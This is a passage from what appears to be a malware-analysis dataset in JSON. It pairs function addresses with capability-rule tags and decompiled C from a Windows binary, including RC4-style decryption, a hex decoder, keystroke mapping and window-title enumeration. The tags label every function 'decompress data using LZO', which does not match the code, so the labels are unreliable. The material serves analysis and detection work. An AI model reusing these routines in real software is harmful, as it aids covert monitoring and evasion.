        "decompiled_code": "\nvoid __fastcall fcn.004611d4(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4611ea;\n    fcn.004059cc();\n    uStack32 = 0x461352;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        uVar1 = *(in_EAX - 4);\n    }\n    uVar1 = uVar1 & 0x80000001;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n    }\n    if (uVar1 == 0) {\n        puStack28 = &stack0xfffffffc;\n        fcn.00405c6c();\n        iVar4 = *param_2;\n        if (iVar4 != 0) {\n            iVar4 = *(iVar4 + -4);\n        }\n        if (0 < iVar4) {\n            iVar3 = 1;\n            do {\n                if (*((in_EAX - 2) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 2) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x37;\n                }\n                iVar2 = fcn.00405a3c();\n                *(iVar2 + -1 + iVar3) = *(*param_2 + -1 + iVar3) << 4;\n                if (*((in_EAX - 1) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 1) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x37;\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x461359;\n    uStack32 = 0x461351;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 777
    },
    "00461360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461360(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x46138b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x461393;\n    fcn.004059cc();\n    uStack1080 = 0x46162d;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.0046114c();\n            }\n            else {\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.0046114c();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.00461360::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.00461360::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.00461360::var_41ch)[uVar3];\n                (&fcn.00461360::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.0046114c();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.00461360::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.00461360::var_41ch + uVar3);\n                    (&fcn.00461360::var_41ch)[uVar3] = (&fcn.00461360::var_41ch)[uVar6];\n                    (&fcn.00461360::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.00461360::var_41ch)[uVar3] + (&fcn.00461360::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.00461360::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.0046114c();\n            fcn.00461154();\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x461634;\n    uStack1080 = 0x46160c;\n    fcn.00405530();\n    uStack1080 = 0x46161f;\n    fcn.004060f8();\n    uStack1080 = 0x46162c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1507
    },
    "0046163c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046163c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x461667;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x46166f;\n    fcn.004059cc();\n    uStack1080 = 0x461908;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            puStack1076 = &stack0xfffffffc;\n            fcn.004611d4();\n            fcn.004055c8();\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.0046114c();\n            }\n            else {\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.0046114c();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.0046163c::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.0046163c::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.0046163c::var_41ch)[uVar3];\n                (&fcn.0046163c::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.0046114c();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.0046163c::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.0046163c::var_41ch + uVar3);\n                    (&fcn.0046163c::var_41ch)[uVar3] = (&fcn.0046163c::var_41ch)[uVar6];\n                    (&fcn.0046163c::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.0046163c::var_41ch)[uVar3] + (&fcn.0046163c::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.0046163c::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.0046114c();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x46190f;\n    uStack1080 = 0x4618e7;\n    fcn.00405530();\n    uStack1080 = 0x4618fa;\n    fcn.004060f8();\n    uStack1080 = 0x461907;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1510
    },
    "0046196c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046196c(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xff;\n    if (0x5a < uVar1) {\n        if (uVar1 < 0xa4) {\n            if (uVar1 == 0xa3) goto code_r0x004619d7;\n            if (((uVar1 - 0x5b < 4) || (uVar1 == 0x60)) || (uVar1 - 0x7b < 4)) goto code_r0x004619f6;\n        }\n        else if (((uVar1 == 0xa7) || (uVar1 == 0xb0)) || (uVar1 == 0xb5)) goto code_r0x004619d7;\ncode_r0x00461a11:\n        sub.user32.dll_VkKeyScanA();\n        fcn.0046194c();\n        return;\n    }\n    if (uVar1 < 0x2e) {\n        if (uVar1 == 0x23) {\ncode_r0x004619f6:\n            fcn.00461934();\n            sub.user32.dll_VkKeyScanA();\n            fcn.0046194c();\n            fcn.00461934();\n            return;\n        }\n        if ((uVar1 != 0x25) && (uVar1 != 0x2b)) goto code_r0x00461a11;\n    }\n    else if ((0xb < uVar1 - 0x2e) && (uVar1 != 0x3f)) {\n        if (uVar1 == 0x40) goto code_r0x004619f6;\n        if (0x19 < uVar1 - 0x41) goto code_r0x00461a11;\n    }\ncode_r0x004619d7:\n    fcn.00461918();\n    sub.user32.dll_VkKeyScanA();\n    fcn.0046194c();\n    fcn.00461918();\n    return;\n}\n",
        "token_count": 465
    },
    "00462e60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00462e60(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char *in_EAX;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uchar *in_EDX;\n    int32_t *unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar5;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar4 = 7;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    puStack24 = 0x462e7e;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack28 = 0x463013;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *in_EDX = 0;\n    var_20h = 0x462e97;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    var_20h = &fcn.00462e60::var_24h;\n    var_24h = 0x462ea3;\n    var_24h = fcn.0040700c();\n    piVar1 = *(arg_8h + -4);\n    iVar4 = (**(*piVar1 + 0xc))(piVar1, 1);\n    if (iVar4 == 0) {\n        *(arg_8h + -8) = *(arg_8h + -8) + 1;\n        fcn.0040700c();\n        uVar2 = fcn.0040700c();\n        iVar4 = (**(*var_ch + 0x24))(var_ch, 0, 0, 0x463024, uVar2);\n        if (iVar4 == 0) {\n            iVar4 = (**(*var_10h + 0xc))(var_10h, 0x463034, &fcn.00462e60::var_20h, 0);\n            uVar5 = iVar4 == 0;\n            if (uVar5) {\n                fcn.00414a4c();\n                fcn.00409b84();\n                fcn.004097e4();\n                fcn.00409b84(1);\n                fcn.004097e4();\n                fcn.00405974();\n                if (uVar5) {\n                    bVar6 = true;\n                }\n                else {\n                    pcVar3 = var_4h;\n                    if (var_4h != NULL) {\n                        pcVar3 = *(var_4h + -4);\n                    }\n                    if (pcVar3 == 0x2) {\n                        bVar6 = *var_4h == '#';\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                    if (bVar6) {\n                        bVar6 = var_4h[1] - 0x30 == *(arg_8h + -8);\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                }\n                if (bVar6) {\n                    fcn.00409b84();\n                    fcn.00405584();\n                    uVar2 = fcn.0040700c();\n                    iVar4 = (**(*var_ch + 0x20))(var_ch, 0, 0, *0x4957f4, uVar2);\n                    *in_EDX = iVar4 == 0;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar1;\n    var_24h = 0x46301a;\n    fcn.00405554();\n    fcn.00411658();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1084
    },
    "00466ed8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00466ed8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x466ef4;\n    fcn.004059cc();\n    puStack32 = 0x466efc;\n    fcn.004059cc();\n    uStack36 = 0x466f61;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00405718();\n            fcn.00405974();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x466f68;\n    uStack36 = 0x466f60;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 278
    },
    "0046f298": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f298(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff60;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x46f409;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack76;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar6 = 0x46f48c;\n            uVar5 = 0x46f48c;\n            uVar4 = 0;\n            uVar2 = var_8h;\n            iVar3 = var_4h;\n            uVar7 = *0x49b188;\n            fcn.00409e64(arg_8h);\n            fcn.0046f264(0x46f48c, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n            fcn.00409d78();\n            in_stack_ffffff60 = 0x46f4a8;\n            fcn.004058e0(0x46f4a8, 0x46f498, 0x46f48c, 0);\n            puVar1 = puStack76;\n        }\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x46f410);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 758
    },
    "0046f4d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f4d4(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff64;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x46f635;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        uVar6 = 0x46f6b8;\n        uVar5 = 0x46f6b8;\n        uVar4 = 0;\n        uVar2 = var_8h;\n        iVar3 = var_4h;\n        uVar7 = *0x49b188;\n        fcn.00409e64(arg_8h);\n        fcn.0046f264(0x46f6b8, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n        fcn.00409d78();\n        in_stack_ffffff64 = 0x46f6d4;\n        fcn.004058e0(0x46f6d4, 0x46f6c4, 0x46f6b8, 0);\n        puVar1 = puStack76;\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff64;\n    fcn.00405554(0x46f63c);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 720
    },
    "0046f700": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f700(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uVar4;\n    uint uVar5;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x46f7d3;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack76;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_30h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_30h);\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack68;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar5 = 0x46f7ec;\n            uVar4 = 0;\n            iVar3 = var_4h;\n            uVar2 = *0x49b188;\n            fcn.00409e64(arg_8h);\n            in_stack_ffffff80 = 0x46f7f8;\n            fcn.004058e0(0x46f7f8, 0, arg_8h, uVar4, uVar5, iVar3, uVar2);\n            puVar1 = puStack68;\n        }\n    }\n    puStack68 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff80;\n    fcn.00405530(0x46f7da);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 524
    },
    "00470294": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00470294(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack32 = 0x4703cd;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack44 = 0x4703a6;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00405584();\n    fcn.0045ea60();\n    piVar1 = var_4h;\n    (**(*var_4h + 0x78))(var_4h, &fcn.00470294::var_8h);\n    fcn.0040711c();\n    if (var_8h < 0xf) {\n        if (var_8h == 0xe) {\n            fcn.00405584();\n        }\n        else if (var_8h == 1) {\n            fcn.00405584();\n        }\n        else if (var_8h == 2) {\n            fcn.00405584();\n        }\n        else if (var_8h == 6) {\n            fcn.00405584();\n        }\n        else if (var_8h == 10) {\n            fcn.00405584();\n        }\n    }\n    else if (var_8h == 0x12) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x22) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x32) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x42) {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = piVar1;\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x4703d4;\n    puStack40 = 0x4703cc;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 550
    },
    "00470518": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00470518(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x470780;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00470518::var_24h;\n    var_28h = 0x470542;\n    fcn.00405530();\n    var_28h = 0x47054a;\n    var_28h = fcn.0040700c();\n    var_2ch = 0x470558;\n    fcn.0045ea60();\n    var_2ch = var_20h;\n    (**(*var_20h + 0x68))();\n    fcn.0040711c();\n    fcn.00407024();\n    iVar2 = fcn.0040648c(0, var_4h, 0x470790);\n    if (-1 < iVar2 + -1) {\n        iVar4 = 0;\n        do {\n            fcn.0040648c(&fcn.00470518::var_24h, var_4h, 0x470798, iVar4);\n            fcn.00407024();\n            fcn.0040648c(&fcn.00470518::var_28h, var_8h, 0x4707a4);\n            fcn.004057d4();\n            fcn.0040648c(&fcn.00470518::var_2ch, var_8h, 0x4707ac);\n            fcn.004057d4();\n            iVar3 = fcn.0040648c(0, var_8h, 0x4707b4);\n            if (iVar3 < 0xf) {\n                if (iVar3 == 0xe) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 1) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 2) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 6) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 10) {\n                    fcn.004055c8();\n                }\n            }\n            else if (iVar3 == 0x12) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x22) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x32) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x42) {\n                fcn.004055c8();\n            }\n            iVar1 = fcn.0040648c(0, var_8h, 0x470868);\n            if (iVar1 == 0) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            var_2ch = 0x47089c;\n            fcn.004058e0();\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x470787;\n    var_28h = 0x47074a;\n    fcn.00405d40();\n    var_28h = 0x470752;\n    fcn.0040700c();\n    var_28h = 0x47075a;\n    fcn.0040700c();\n    var_28h = 0x470762;\n    fcn.0040700c();\n    var_28h = 0x47076f;\n    fcn.00405554();\n    var_28h = 0x470777;\n    fcn.0040700c();\n    var_28h = 0x47077f;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1095
    },
    "00470e48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
